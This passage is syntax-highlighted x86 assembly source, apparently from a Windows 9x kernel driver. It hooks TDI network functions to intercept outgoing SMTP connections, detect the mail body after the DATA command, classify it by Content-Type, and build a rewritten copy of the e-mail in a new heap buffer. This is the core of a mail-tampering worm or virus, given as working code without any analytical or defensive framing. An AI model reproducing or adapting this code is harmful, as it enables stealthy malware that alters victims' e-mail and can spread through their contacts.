        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiDisconnect_Delta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">codeaddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiDisconnect_Hook</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x1C</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; ---------- Hook TdiCloseConnection ----------</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x0C</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiCloseConnection_PrevAddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; patch some things in it</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiCloseConnection_Jmp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiCloseConnection_Delta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">codeaddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiCloseConnection_Hook</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x0C</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc9">.exit</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  TdiConnect_Hook</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">TdiConnect_Hook</span><span class="sc4">:</span><span class="sc1">; MOV   EDI, &lt;address_of_code_in_heap&gt;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0xBF</span><span class="sc0">
</span><span class="sc5">TdiConnect_Delta</span><span class="sc4">:</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; esi = *RequestAddr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x14</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; esi = *RemoteAddr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x06</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; TDI_ADDRESS_TYPE_IP</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">TdiConnect_Hook_Jmp</span><span class="sc0">

        </span><span class="sc1">;  check if the connection is to an SMTP server</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1900</span><span class="sc0">          </span><span class="sc1">; smtp ?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">.smtp_on</span><span class="sc0">

        </span><span class="sc1">;  if not, get out</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">TdiConnect_Hook_Jmp</span><span class="sc0">

</span><span class="sc5">.smtp_on</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;mov    byte [edi + Trace], 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TraceHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">TdiConnect_Hook_Jmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc1">;       jmp [TdiConnect_Jmp]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x25</span><span class="sc0">
</span><span class="sc5">TdiConnect_Jmp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  TdiSend_Hook</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">TdiSend_Hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc1">; MOV   EDI, &lt;address_of_code_in_heap&gt;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0xBF</span><span class="sc0">
</span><span class="sc5">TdiSend_Delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

        </span><span class="sc1">; check if we trace the correct connection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TraceHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">.jump_over</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">
</span><span class="sc5">.jump_over</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; so we are tracing our SMTP connection</span><span class="sc0">
        </span><span class="sc1">; get the buffer length and address</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x14</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; eax = *SendBuffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x04</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; esi = source buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x0C</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ecx = length</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sourcebuf</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buflen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; check NextIsMail flag</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NextIsMail</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">.Mail</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">search_str</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncmpi</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">.pass_1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">
</span><span class="sc5">.pass_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; set NextIsMail flag</span><span class="sc0">
        </span><span class="sc1">;   This flag is set when the DATA instruction for SMTP server is sent.</span><span class="sc0">
        </span><span class="sc1">;   DATA command is sent before sending the mail body.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NextIsMail</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">

</span><span class="sc5">.Mail</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">; reset NextIsMail flag</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NextIsMail</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc1">; search in the mail for "Content-Type" string</span><span class="sc0">
        </span><span class="sc1">; ESI = buffer source</span><span class="sc0">
        </span><span class="sc1">; ECX = buffer length</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">strContentType</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; save ESI</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; ESI = EDX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strlen</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; restore ESI</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; ECX = EAX</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buflen</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">.next</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncmpi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">.found_1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">.not_found_1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.next</span><span class="sc0">

</span><span class="sc5">.not_found_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">

</span><span class="sc5">.found_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mark1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">      </span><span class="sc1">; save the position of "Content-Type" witch is the begin of the text mail</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.pass_2</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">.pass_2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">; ESI points after "Content-Type:"</span><span class="sc0">
        </span><span class="sc1">; check if Content-Type is text/plain -&gt; this mean the e-mail is a simple text mail</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">strTextPlain</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strlen</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncmpi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.not_textplain</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mailtype</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; text/plain</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.go_for_it</span><span class="sc0">

</span><span class="sc5">.not_textplain</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">strMultipartAlternative</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strlen</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncmpi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.not_multipartalternative</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mailtype</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; text/plain + text/html</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.go_for_it</span><span class="sc0">

</span><span class="sc5">.not_multipartalternative</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">strMultipartMixed</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strlen</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strncmpi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.not_multipartmixed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mailtype</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; text + probably attachement</span><span class="sc0">
</span><span class="sc1">;       jmp .go_for_it</span><span class="sc0">
</span><span class="sc5">.not_multipartmixed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">

</span><span class="sc5">.go_for_it</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EIP reached here if the e-mail is text/plain</span><span class="sc0">
        </span><span class="sc1">; find the end of mail and save it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sourcebuf</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">.again_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">.found_2</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.again_1</span><span class="sc0">
</span><span class="sc5">.found_2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mark2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc1">; Get some memory for the new e-mail</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buflen</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;       add ecx, [edi + newmaillen]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15000</span><span class="sc0">
        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">_HeapAllocate</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">HEAPZEROINIT</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.pass_3</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">
</span><span class="sc5">.pass_3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newmailaddr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; copy until original "Content-Type"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sourcebuf</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mark1</span><span class="sc4">]</span><span class="sc0">
